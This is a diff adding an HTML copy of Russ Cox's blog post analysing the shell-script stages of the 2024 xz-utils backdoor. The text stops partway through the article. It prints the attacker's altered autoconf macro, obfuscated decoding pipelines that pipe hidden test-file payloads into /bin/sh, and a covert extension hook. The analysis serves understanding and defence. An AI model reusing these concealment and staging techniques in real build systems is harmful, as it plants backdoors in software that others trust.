@@ -1,0 +1,1398 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>research!rsc: The xz attack shell script</title>
+    <link rel="alternate" type="application/atom+xml" title="research!rsc - Atom" href="https://research.swtch.com/feed.atom" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="fonts/minion3/fonts.css" rel="stylesheet">
+<link href="fonts/source-code-pro/source-code-pro.css" rel="stylesheet">
+
+<style>
+  body {
+    padding: 0;
+    margin: 0;
+    font-size: 100%;
+    font-family: 'Minion 3', serif;
+  }
+  @media print {
+    img {page-break-inside: avoid;}
+    div.nosplit {page-break-inside: avoid;}
+  }
+  img.center {
+    display: block;
+    margin: 0 auto;
+  }
+  img.resizable {
+    max-width: 100%;
+    height: auto;
+  }
+  .pad {
+    padding-top: 1em;
+    padding-bottom: 1em;
+  }
+  p img.pad {
+    padding-top: 0 !important;
+    padding-bottom: 0 !important;
+  }
+  a.anchor, a.back, a.footnote, a.fnref, a.footref {
+    color: black !important;
+    text-decoration: none !important;
+  }
+  a.back, a.fnref {
+    font-size: 50%;
+  }
+  @media print {
+    a.back, a.fnref {display: none;}
+  }
+  .header {
+    height: 1.25em;
+    background-color: #dff;
+    margin: 0;
+    padding: 0.1em 0.1em 0.2em;
+    border-top: 1px solid black;
+    border-bottom: 1px solid #8ff;
+  }
+  .header h3 {
+    margin: 0;
+    padding: 0 2em;
+    display: inline-block;
+    padding-right: 2em;
+    font-style: italic;
+    font-size: 90%;
+  }
+  .rss {
+    float: right;
+    padding-top: 0.2em;
+    padding-right: 2em;
+    display: none;
+  }
+  .toc {
+    margin-top: 2em;
+  }
+  .toc-title {
+    font-family: cursive, serif;
+    font-style: italic;
+    font-size: 300%;
+    line-height: 83%;
+  }
+  .toc-subtitle {
+    display: block;
+    margin-bottom: 1em;
+    font-size: 83%;
+  }
+  @media only screen and (max-width: 550px) { .toc-subtitle { display: none; } }
+  .header h3 a {
+    color: black;
+  }
+  .header h4 {
+    margin: 0;
+    padding: 0;
+    display: inline-block;
+    font-weight: normal;
+    font-size: 83%;
+  }
+  @media only screen and (max-width: 550px) { .header h4 { display: none; } }
+  .main {
+    padding: 0 2em;
+  }
+  @media only screen and (max-width: 479px) { .article { font-size: 120%; } }
+  .article h1 {
+    text-align: center;
+    font-size: 200%;
+  }
+  @media print {
+    .article h1 {
+      margin-top: 0;
+      font-size: 150%;
+    }
+    .whenprint {
+      margin-top: 0.25in;
+    }
+  }
+  .copyright {
+    font-size: 83%;
+  }
+  .subtitle {
+      font-size: 83%;
+  }
+  @media print {
+    .subtitle {
+      font-size: 12pt;
+    }
+  }
+  .normal {
+    font-size: medium;
+    font-weight: normal;
+  }
+  .when {
+    text-align: center;
+    font-size: 100%;
+    margin: 0;
+    padding: 0;
+  }
+  .when p {
+    margin: 0;
+    padding: 0;
+  }
+  .article h2 {
+    font-size: 125%;
+    padding-top: 0.25em;
+  }
+  .article h3 {
+    font-size: 100%;
+  }
+  pre {
+    margin-left: 4em;
+    margin-right: 4em;
+  }
+  pre, code {
+    font-family: 'Source Code Pro', monospace;
+    font-size: 90%;
+  }
+  .showcode pre {
+    margin: 0;
+    font-family: 'Source Code Pro', monospace;
+  }
+  .showcode-src a {
+    color: black;
+    font-family: 'Source Code Pro', monospace;
+    font-size: 90%;
+  }
+  .showcode-comment {
+    color: #666;
+  }
+  .showcode-src {
+    float: right;
+    margin-left: 2em;
+    margin-right: 2em;
+  }
+  .showcode {
+    margin-left: 2em;
+    margin-right: 2em;
+    background: #ffffe9;
+    padding: 0.5em;
+    border: 1px solid black;
+    font-weight: 500;
+    break-before: avoid;
+  }
+  @media print {
+    .showcode { font-weight: normal; }
+  }
+  .showcode-end {
+    clear: right;
+  }
+  @media print {
+    pre { font-size: 83%; }
+    .showcode-src { font-size: 83%; }
+  }
+  .footer {
+    margin-top: 10px;
+    font-size: 83%;
+    font-family: sans-serif;
+  }
+  .comments {
+    margin-top: 2em;
+    background-color: #ffe;
+    border-top: 1px solid #aa4;
+    border-left: 1px solid #aa4;
+    border-right: 1px solid #aa4;
+  }
+  .comments-header {
+    padding: 0 5px 0 5px;
+  }
+  .comments-header p {
+    padding: 0;
+    margin: 3px 0 0 0;
+  }
+  .comments-body {
+    padding: 5px 5px 5px 5px;
+  }
+  #plus-comments {
+    border-bottom: 1px dotted #ccc;
+  }
+  .plus-comment {
+    width: 100%;
+    font-size: 14px;
+    border-top: 1px dotted #ccc;
+  }
+  .me {
+    background-color: #eec;
+  }
+  .plus-comment ul {
+    margin: 0;
+    padding: 0;
+    list-style: none;
+    width: 100%;
+    display: inline-block;
+  }
+  .comment-when {
+    color:#999;
+    width:auto;
+    padding:0 5px;
+  }
+  .old {
+    font-size: 83%;
+  }
+  .plus-comment ul li {
+    display: inline-block;
+    vertical-align: top;
+    margin-top: 5px;
+    margin-bottom: 5px;
+    padding: 0;
+  }
+  .plus-icon {
+    width: 45px;
+  }
+  .plus-img {
+    float: left;
+    margin: 4px 4px 4px 4px;
+    width: 32px;
+    height: 32px;
+  }
+  .plus-comment p {
+    margin: 0;
+    padding: 0;
+  }
+  .plus-clear {
+    clear: left;
+  }
+  .toc-when {
+    font-size: 83%;
+    color: #999;
+  }
+  .toc {
+    list-style: none;
+  }
+  .toc li {
+    margin-bottom: 0.5em;
+  }
+  .toc-head {
+    margin-bottom: 1em !important;
+    font-size: 117%;
+  }
+  .toc-summary {
+    margin-left: 2em;
+  }
+  .favorite {
+    font-weight: bold;
+  }
+  .article p, .article ol {
+    line-height: 144%;
+  }
+  sup, sub {
+    vertical-align: baseline;
+    position: relative;
+    font-size: 83%;
+  }
+  sup {
+    bottom: 1ex;
+  }
+  sub {
+    top: 0.8ex;
+  }
+
+  .main {
+    position: relative;
+    margin: 0 auto;
+    padding: 0;
+    width: 900px;
+  }
+  @media print {
+    .main {
+      width: 7in;
+    }
+  }
+  .main-wide {
+    margin: 0 auto;
+  }
+  @media only screen and (min-width: 768px) and (max-width: 959px) { .main { width: 708px; } }
+  @media only screen and (min-width: 640px) and (max-width: 767px) { .main { width: 580px; } }
+  @media only screen and (min-width: 480px) and (max-width: 639px) { .main { width: 420px; } }
+  @media only screen and (max-width: 479px) { .main { width: 300px; } }
+
+  div.center { margin: 0 auto; }
+  div.lemma > p:first-child { margin-top: 0.25em; }
+  div.lemma > p:last-child { margin-bottom: 0.25em; }
+  h2, h3 { break-after: avoid; }
+  div.math { break-before: avoid; }
+  div.ivyRun {
+    break-before: avoid;
+    break-inside: avoid;
+    line-height: 1.2;
+  }
+  .ivyRunIn {
+    line-height: 1.2;
+  }
+  ul { break-before: avoid; }
+  pre { before-before: avoid; break-inside: avoid; }
+  div.lemma{
+    border: 1px solid black;
+    padding: 0 0.5em 0 0.5em;
+    margin: 0.5em;
+  }
+  mtd { padding: 0.5ex 0.2em 0.5ex 0.2em; }
+  mi, mtext, mn { font-family: 'Minion 3'; }
+  mn.nbf { font-weight: bold; }
+  math[display="block"] { padding: 0.5em 0; }
+  pre code !important { word-spacing: normal; }
+  code { word-spacing: -0.25em; }
+  table.md {
+    border-top: 2px solid black;
+    margin: 0 auto;
+    border-bottom: 1px solid black;
+    break-before: avoid;
+    break-inside: avoid;
+    border-collapse: collapse;
+  }
+  table.md tr.th {
+    border-bottom: 1px solid black;
+  }
+  table.md td { padding-left: 1ex; padding-right: 1ex; }
+  table.md td:nth-child(1) { padding-left: 0 !important; }
+  table.md td:last-child { padding-right: 0 !important; }
+  p {
+    widows: 2;
+    orphans: 2;
+  }
+  pre.language-in {
+    background: #ffffe9;
+    margin-left: 2em;
+    margin-right: 2em;
+    padding: 0.5em;
+    border: 1px solid black;
+    margin-bottom: 0;
+    border-bottom: 0.5px solid black;
+  }
+  pre.language-out {
+    margin-top: 0;
+    background: #f8f8f8;
+    margin-left: 2em;
+    margin-right: 2em;
+    padding: 0.5em;
+    border: 1px solid black;
+    border-top: none;
+  }
+  .oldnum { font-variant-numeric: oldstyle-nums; }
+  .smallcaps { font-variant-caps: small-caps; }
+  .whenprint {
+    display: none;
+  }
+  @media print {
+    body {
+      font-size: 10pt;
+    }
+    a {
+      color: black;
+      text-decoration: none;
+    }
+    .header {
+      display: none;
+    }
+    .whenprint {
+      display: block;
+    }
+    .when {
+      display: none;
+    }
+    .main {
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .ivyRunIn, .ivyBottomRunIn {
+      border-bottom: 1px solid #ccc;
+    }
+    @page {
+      margin-top: 0.75in;
+      margin-bottom: 0.75in;
+      @top-center {
+        font-size: 10pt;
+        margin-top: 0.25in;
+        content: "The xz attack shell script";
+        font-family: 'Minion Pro', 'Minion 3', serif;
+        font-style: italic;
+      }
+      @bottom-center {
+        content: counter(page);
+        font-size: 10pt;
+        margin-bottom: 0.25in;
+        font-variant-numeric: oldstyle-nums;
+        font-family: 'Minion Pro', 'Minion 3', serif;
+      }
+    }
+    @page :first {
+      margin-top: 0.5in !important;
+      @top-center {
+         content: "";
+      }
+      @bottom-center {
+         font-style: italic;
+         content: "";
+      }
+    }
+  }
+  ol.fn {
+    list-style: none;
+    counter-reset: footnote;
+    padding-left: 0;
+  }
+  ol.fn li {
+    counter-increment: footnote;
+    text-indent: -30px;
+    padding-left: 30px;
+  }
+  ol.fn li::before {
+    content: "[" counter(footnote) "] ";
+  }
+}
+</style>
+
+  </head>
+  <body>
+
+
+
+<div class="header">
+  <h3><a href="/">research!rsc</a></h3>
+  <h4>Thoughts and links about programming,
+    by <a href="https://swtch.com/~rsc/" rel="author">Russ Cox</a> </h4>
+  <a class="rss" href="/feed.atom">RSS</a>
+</div>
+
+    <div class="main">
+      <div class="article">
+        <h1>The xz attack shell script
+
+        <div class="normal">
+        <div class="whenprint">
+Russ Cox<br>
+
+April 2, 2024
+<br>Updated April 3, 2024.
+<br>
+<i>research.swtch.com/xz-script</i>
+
+        </div>
+        <div class="when">
+
+            Posted on Tuesday, April 2, 2024.<br>Updated Wednesday, April 3, 2024.
+
+
+        </div>
+        </div>
+        </h1>
+       <a class=anchor href="#introduction"><h2 id="introduction">Introduction</h2></a>
+
+
+<p>
+Andres Freund <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">published the existence of the xz attack</a> on 2024-03-29 to the public oss-security@openwall mailing list. The day before, he alerted Debian security and the (private) distros@openwall list. In his mail, he says that he dug into this after “observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors).”
+
+<p>
+At a high level, the attack is split in two pieces: a shell script and an object file. There is an injection of shell code during <code>configure</code>, which injects the shell code into <code>make</code>. The shell code during <code>make</code> adds the object file to the build. This post examines the shell script. (See also <a href="xz-timeline">my timeline post</a>.)
+
+<p>
+The nefarious object file would have looked suspicious checked into the repository as <code>evil.o</code>, so instead both the nefarious shell code and object file are embedded, compressed and encrypted, in some binary files that were added as “test inputs” for some new tests. The test file directory already existed from long before Jia Tan arrived, and the README explained “This directory contains bunch of files to test handling of .xz, .lzma (LZMA_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better “source code” than the files themselves.” This is a fact of life for parsing libraries like liblzma. The attacker looked like they were just <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">adding a few new test files</a>.
+
+<p>
+Unfortunately the nefarious object file turned out to have a bug that caused problems with Valgrind, so the test files needed to be updated to add the fix. <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1">That commit</a> explained “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.” The attackers realized at this point that they needed a better update mechanism, so the new nefarious script contains an extension mechanism that lets it look for updated scripts in new test files, which wouldn’t draw as much attention as rewriting existing ones.
+
+<p>
+The effect of the scripts is to arrange for the nefarious object file’s <code>_get_cpuid</code> function to be called as part of a <a href="https://sourceware.org/glibc/wiki/GNU_IFUNC">GNU indirect function</a> (ifunc) resolver. In general these resolvers can be called lazily at any time during program execution, but for security reasons it has become popular to call all of them during dynamic linking (very early in program startup) and then map the <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">global offset table (GOT) and procedure linkage table (PLT) read-only</a>, to keep buffer overflows and the like from being able to edit it. But a nefarious ifunc resolver would run early enough to be able to edit those tables, and that’s exactly what the backdoor introduced. The resolver then looked through the tables for <code>RSA_public_decrypt</code> and replaced it with a nefarious version that <a href="https://github.com/amlweems/xzbot">runs attacker code when the right SSH certificate is presented</a>.
+<a class=anchor href="#configure"><h2 id="configure">Configure</h2></a>
+
+
+<p>
+Again, this post looks at the script side of the attack. Like most complex Unix software, xz-utils uses GNU autoconf to decide how to build itself on a particular system. In ordinary operation, autoconf reads a <code>configure.ac</code> file and produces a <code>configure</code> script, perhaps with supporting m4 files brought in to provide “libraries” to the script. Usually, the <code>configure</code> script and its support libraries are only added to the tarball distributions, not the source repository. The xz distribution works this way too.
+
+<p>
+The attack kicks off with the attacker adding an unexpected support library, <code>m4/build-to-host.m4</code> to the xz-5.6.0 and xz-5.6.1 tarball distributions. Compared to the standard <code>build-to-host.m4</code>, the attacker has made the following changes:
+<pre>diff --git a/build-to-host.m4 b/build-to-host.m4
+index ad22a0a..d5ec315 100644
+--- a/build-to-host.m4
++++ b/build-to-host.m4
+@@ -1,5 +1,5 @@
+-# build-to-host.m4 serial 3
+-dnl Copyright (C) 2023 Free Software Foundation, Inc.
++# build-to-host.m4 serial 30
++dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
+ dnl This file is free software; the Free Software Foundation
+ dnl gives unlimited permission to copy and/or distribute it,
+ dnl with or without modifications, as long as this notice is preserved.
+@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],
+
+
+   dnl Define somedir_c.
+   gl_final_[$1]="$[$1]"
++  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
+   dnl Translate it from build syntax to host syntax.
+   case "$build_os" in
+     cygwin*)
+@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
+   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
+     [$1]_c_make='\"$([$1])\"'
+   fi
++  if test "x$gl_am_configmake" != "x"; then
++    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null'
++  else
++    gl_[$1]_config=''
++  fi
++  _LT_TAGDECL([], [gl_path_map], [2])dnl
++  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
++  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
++  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
++  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
+   AC_SUBST([$1_c_make])
++
++  dnl If the host conversion code has been placed in $gl_config_gt,
++  dnl instead of duplicating it all over again into config.status,
++  dnl then we will have config.status run $gl_config_gt later, so it
++  dnl needs to know what name is stored there:
++  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
+ ])
+
+
+ dnl Some initializations for gl_BUILD_TO_HOST.
+ AC_DEFUN([gl_BUILD_TO_HOST_INIT],
+ [
++  dnl Search for Automake-defined pkg* macros, in the order
++  dnl listed in the Automake 1.10a+ documentation.
++  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2&gt;/dev/null`
++  if test -n "$gl_am_configmake"; then
++    HAVE_PKG_CONFIGMAKE=1
++  else
++    HAVE_PKG_CONFIGMAKE=0
++  fi
++
+   gl_sed_double_backslashes='s/\\/\\\\/g'
+   gl_sed_escape_doublequotes='s/"/\\"/g'
++  gl_path_map='tr "\t \-_" " \t_\-"'
+ changequote(,)dnl
+   gl_sed_escape_for_make_1="s,\\([ \"&amp;'();&lt;&gt;\\\\\`|]\\),\\\\\\1,g"
+ changequote([,])dnl
+</pre>
+
+
+<p>
+All in all, this is a fairly plausible set of diffs, in case anyone thought to check. It bumps the version number, updates the copyright year to look current, and makes a handful of inscrutable changes that don’t look terribly out of place.
+
+<p>
+Looking closer, something is amiss. Starting near the bottom,
+<pre>gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2&gt;/dev/null`
+if test -n "$gl_am_configmake"; then
+  HAVE_PKG_CONFIGMAKE=1
+else
+  HAVE_PKG_CONFIGMAKE=0
+fi
+</pre>
+
+
+<p>
+Let’s see which files in the distribution match the pattern (simplifying the <code>grep</code> command):
+<pre>% egrep -Rn '####[[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]]####$'
+Binary file ./tests/files/bad-3-corrupt_lzma2.xz matches
+%
+</pre>
+
+
+<p>
+That’s surprising! So this script sets <code>gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz</code> and <code>HAVE_PKG_CONFIGMAKE=1</code>. The <code>gl_path_map</code> setting is a <a href="https://linux.die.net/man/1/tr">tr(1)</a> command that swaps tabs and spaces and swaps underscores and dashes.
+
+<p>
+Now reading the top of the script,
+<pre>gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
+</pre>
+
+
+<p>
+extracts the final dot-separated element of that filename, leaving <code>xz</code>. That is, it’s the file name suffix, not a prefix, and it is the name of the compression command that is likely already installed on any build machine.
+
+<p>
+The next section is:
+<pre>if test "x$gl_am_configmake" != "x"; then
+  gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null'
+else
+  gl_[$1]_config=''
+fi
+</pre>
+
+
+<p>
+We know that <code>gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz</code>, so this sets the <code>gl_[$1]_config</code> variable to the string
+<pre>sed "r\n" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null
+</pre>
+
+
+<p>
+At first glance, especially in the original quoted form, the <code>sed</code> command looks like it has something to do with line endings, but in fact <code>r\n</code> is the <code>sed</code> “read from file <code>\n</code>” command. Since the file <code>\n</code> does not exist, the command does nothing at all, and then since <code>sed</code> has not been invoked with the <code>-n</code> option, <code>sed</code> prints each line of input. So <code>sed "r\n"</code> is just an obfuscated <code>cat</code> command, and remember that <code>$gl_path_map</code> is the <code>tr</code> command from before, and <code>$gl_[$1]_prefix</code> is <code>xz</code>. To the shell, this command is really
+<pre>cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
+</pre>
+
+
+<p>
+But right now it’s still just a string; it hasn’t been run. That changes with
+<pre>dnl If the host conversion code has been placed in $gl_config_gt,
+dnl instead of duplicating it all over again into config.status,
+dnl then we will have config.status run $gl_config_gt later, so it
+dnl needs to know what name is stored there:
+AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
+</pre>
+
+
+<p>
+The final <code>"eval \$gl_[$1]_config"</code> runs that command. If we run it on the xz 5.6.0 repo, we get:
+<pre>$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
+####Hello####
+#��Z�.hj�
+eval `grep ^srcdir= config.status`
+if test -f ../../config.status;then
+eval `grep ^srcdir= ../../config.status`
+srcdir="../../$srcdir"
+fi
+export i="((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)";
+(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
+    eval $i|tail -c +31265|
+    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|
+    xz -F raw --lzma1 -dc|/bin/sh
+####World####
+$
+</pre>
+
+
+<p>
+I have inserted some line breaks, here and in later script fragments,
+to keep the lines from being too long in the web page.
+
+<p>
+Why the Hello and World? The README text that came with the test file describes it:<blockquote>
+
+<p>
+bad-3-corrupt_lzma2.xz has three Streams in it. The first and third streams are valid xz Streams. The middle Stream has a correct Stream Header, Block Header, Index and Stream Footer. Only the LZMA2 data is corrupt. This file should decompress if <code>--single-stream</code> is used.</blockquote>
+
+<p>
+The first and third streams are the Hello and World, and the middle stream has been corrupted by swapping the byte values unswapped by the <code>tr</code> command.
+
+<p>
+Recalling that xz 5.6.1 shipped with different “test” files, we can also try xz 5.6.1:
+<pre>$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
+####Hello####
+#�U��$�
+[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
+[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
+[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
+[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
+[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
+eval `grep ^srcdir= config.status`
+if test -f ../../config.status;then
+eval `grep ^srcdir= ../../config.status`
+srcdir="../../$srcdir"
+fi
+export i="((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+    (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)";
+(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
+    eval $i|tail -c +31233|
+    tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|
+    xz -F raw --lzma1 -dc|/bin/sh
+####World####
+$
+</pre>
+
+
+<p>
+The first difference is that the script makes sure (very sure!) to exit if not being run on Linux. The second difference is that the long “<code>export i</code>” line deviates in the final head command offset (724 vs 939) and then the tail offset and the <code>tr</code> argument. Let’s break those down.
+
+<p>
+The <code>head</code> command prints a prefix of its input. Let’s look at the start:
+<pre>(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; ...
+</pre>
+
+
+<p>
+This discards the first kilobyte of standard input, prints the next two kilobytes, discards the next kilobyte, and prints the next two kilobytes. And so on. The whole command for 5.6.1 is:
+<pre>(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+... 16 times total ...
+head -c +939
+</pre>
+
+
+<p>
+The shell variable <code>i</code> is set to this long command. Then the script runs:
+<pre>xz -dc $srcdir/tests/files/good-large_compressed.lzma |
+eval $i |
+tail -c +31233 |
+tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" |
+xz -F raw --lzma1 -dc |
+/bin/sh
+</pre>
+
+
+<p>
+The first <code>xz</code> command uncompresses another malicious test file. The <code>eval</code> then runs the <code>head</code> pipeline, extracting a total of 16×2048+939 = 33,707 bytes. Then the <code>tail</code> command keeps only the final 31,233 bytes. The <code>tr</code> command applies a simple substitution cipher to the output (so that just in case anyone thought to pull these specific byte ranges out of the file, they wouldn’t recognize it as a valid lzma input!?). The second <code>xz</code> command decodes the translated bytes as a raw lzma stream, and then of course the result is piped through the shell.
+
+<p>
+Skipping the shell pipe, we can run this, obtaining a very long shell script. I have added commentary in between sections of the output.
+<pre>$ xz -dc $srcdir/tests/files/good-large_compressed.lzma |
+  eval $i |
+  tail -c +31233 |
+  tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
+  xz -F raw --lzma1 -dc
+P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
+C="pic_flag=\" $P\""
+O="^pic_flag=\" -fPIC -DPIC\"$"
+R="is_arch_extension_supported"
+x="__get_cpuid("
+p="good-large_compressed.lzma"
+U="bad-3-corrupt_lzma2.xz"
+</pre>
+
+
+<p>
+So far, setting up environment variables.
+<pre>[ ! $(uname)="Linux" ] &amp;&amp; exit 0  # 5.6.1 only
+</pre>
+
+
+<p>
+A line that only appears in 5.6.1, exiting when not run on Linux. In general the scripts in 5.6.0 and 5.6.1 are very similar: 5.6.1 has a few additions. We will examine the 5.6.1 script, with the additions marked. This line is an attempted robustness fix with a bug (pointed out by Jakub Wilk): there are no spaces around the <code>=</code>, making the line a no-op.
+<pre>eval $zrKcVq
+</pre>
+
+
+<p>
+The first of many odd eval statements, for variables that do not appear to be set anywhere. One possibility is that these are debug prints: when the attacker is debugging the script, setting, say, <code>zrKcVq=env</code> inserts a debug print during execution. Another possibility is that these are extension points that can be set by some other mechanism, run before this code, in the future.
+<pre>if test -f config.status; then
+eval $zrKcSS
+eval `grep ^LD=\'\/ config.status`
+eval `grep ^CC=\' config.status`
+eval `grep ^GCC=\' config.status`
+eval `grep ^srcdir=\' config.status`
+eval `grep ^build=\'x86_64 config.status`
+eval `grep ^enable_shared=\'yes\' config.status`
+eval `grep ^enable_static=\' config.status`
+eval `grep ^gl_path_map=\' config.status`
+</pre>
+
+
+<p>
+If <code>config.status</code> exists, we read various variables from it into the shell, along with two extension points. Note that we are still inside the config.status check (let’s call it “if #1”) as we continue through the output.
+<pre># Entirely new in 5.6.1
+vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2&gt;/dev/null`
+if test "x$vs" != "x" &gt; /dev/null 2&gt;&amp;1;then
+f1=`echo $vs | cut -d: -f1`
+if test "x$f1" != "x" &gt; /dev/null 2&gt;&amp;1;then
+start=`expr $(echo $vs | cut -d: -f2) + 7`
+ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2&gt;/dev/null`
+if test "x$ve" != "x" &gt; /dev/null 2&gt;&amp;1;then
+f2=`echo $ve | cut -d: -f1`
+if test "x$f2" != "x" &gt; /dev/null 2&gt;&amp;1;then
+[ ! "x$f2" = "x$f1" ] &amp;&amp; exit 0
+[ ! -f $f1 ] &amp;&amp; exit 0
+end=`expr $(echo $ve | cut -d: -f2) - $start`
+eval `cat $f1 | tail -c +${start} | head -c +${end} |
+    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
+    xz -F raw --lzma2 -dc`
+fi
+fi
+fi
+fi
+</pre>
+
+
+<p>
+This section is entirely new in 5.6.1. It looks for a single test file to contain the magic texts <code>'~!:_ W'</code> and <code>'|_!{ -'</code>, extracts the bytes between them, applies a substitution cipher, decompresses the result, and evaluates the output as a shell script. This appears to be an extension mechanism, so that the next time changes are needed in this script, a new script can be added in a different test file, instead of having to <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1">make up reasons to regenerate existing binary test files</a>.
+
+<p>
+The next chunk continues with script that was present in 5.6.0.
+<pre>eval $zrKccj
+if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+</pre>
+
+
+<p>
